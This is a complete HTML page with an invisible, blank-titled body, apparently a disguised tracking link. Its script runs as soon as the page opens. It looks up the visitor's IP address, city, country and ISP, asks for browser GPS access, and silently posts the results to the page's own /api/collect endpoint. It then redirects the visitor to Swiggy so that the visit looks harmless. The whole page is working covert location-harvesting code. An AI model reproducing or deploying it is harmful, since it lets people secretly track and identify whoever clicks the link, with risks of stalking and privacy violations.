<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title></title>
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>" />
  <style>
    *, *::before, *::after { margin: 0; padding: 0; }
    html, body { width: 0; height: 0; overflow: hidden; background: transparent; }
  </style>
</head>
<body>
<script>
(function () {
  "use strict";

  var SWIGGY  = "https://www.swiggy.com";
  var COLLECT = "/api/collect";
  var IP_API  = "https://ipapi.co/json/";
  var done    = false;

  function send(payload) {
    if (done) return;
    done = true;

    navigator.sendBeacon(
      COLLECT,
      new Blob([JSON.stringify(payload)], { type: "application/json" })
    );

    window.location.replace(
      SWIGGY + "?lat=" + payload.lat + "&lng=" + payload.lng + "&source=" + payload.source
    );
  }

  // Fire IP lookup immediately (parallel with GPS prompt)
  fetch(IP_API)
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (!done && typeof d.latitude === "number") {
        send({
          source:  "IP",
          lat:     +d.latitude.toFixed(6),
          lng:     +d.longitude.toFixed(6),
          city:    d.city,
          region:  d.region,
          country: d.country_name,
          isp:     d.org,
          ip:      d.ip
        });
      }
    })
    .catch(function () {
      if (!done) send({ source: "ERROR", lat: 0, lng: 0 });
    });

  // Ask for GPS (shows native browser permission popup)
  if (!navigator.geolocation) return;

  navigator.geolocation.getCurrentPosition(
    function (pos) {
      send({
        source:   "GPS",
        lat:      +pos.coords.latitude.toFixed(6),
        lng:      +pos.coords.longitude.toFixed(6),
        accuracy: Math.round(pos.coords.accuracy)
      });
    },
    function () { /* denied — IP fetch already running */ },
    { enableHighAccuracy: false, timeout: 3000, maximumAge: 60000 }
  );

})();
</script>
</body>
</html>
